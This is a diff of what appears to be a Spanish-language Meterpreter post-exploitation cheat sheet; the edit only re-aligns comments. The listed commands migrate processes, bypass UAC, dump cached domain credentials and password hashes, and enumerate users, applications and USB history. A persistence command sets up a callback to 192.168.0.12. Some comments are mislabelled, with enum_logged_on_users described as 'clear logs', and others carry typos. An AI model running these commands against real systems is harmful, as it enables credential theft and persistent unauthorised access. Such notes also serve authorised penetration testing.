@@ -50,17 +50,17 @@ download 	# Descargar archivos target->server
 
 
 ### Use Scripst ###
-run post/windows/manage/migrate		# migrar el proceso de meterpreter
-run post/windows/gather 	# Recolectar informacion
-run post/windows/wlan/wlan_ 	# Wlan Discober
-run post/windows/escalate/bypassuac 	#Elevar privilejios
-run post/windows/gather/cachedump 	# Usuarios del dominio
-run post/windows/gather/enum_logged_on_users		# clear logs
-run post/windows/gather/enum_snmp	# SMP config
-run post/windows/gather/hashdump	# Hash Dump
-run post/windows/gather/usb_history # USBs conectados
+run post/windows/manage/migrate		            # migrar el proceso de meterpreter
+run post/windows/gather 	                    # Recolectar informacion
+run post/windows/wlan/wlan_ 	                # Wlan Discober
+run post/windows/escalate/bypassuac 	        # Elevar privilejios
+run post/windows/gather/cachedump 	            # Usuarios del dominio
+run post/windows/gather/enum_logged_on_users	# clear logs
+run post/windows/gather/enum_snmp	            # SMP config
+run post/windows/gather/hashdump	            # Hash Dump
+run post/windows/gather/usb_history             # USBs conectados
 run persistence -U -i 5 -p 80 -r 192.168.0.12 	# persistencia
-run post/windows/gather/enum_applications	# Enumeracion de aplicaciones instaladas
+run post/windows/gather/enum_applications	    # Enumeracion de aplicaciones instaladas
 
 
  
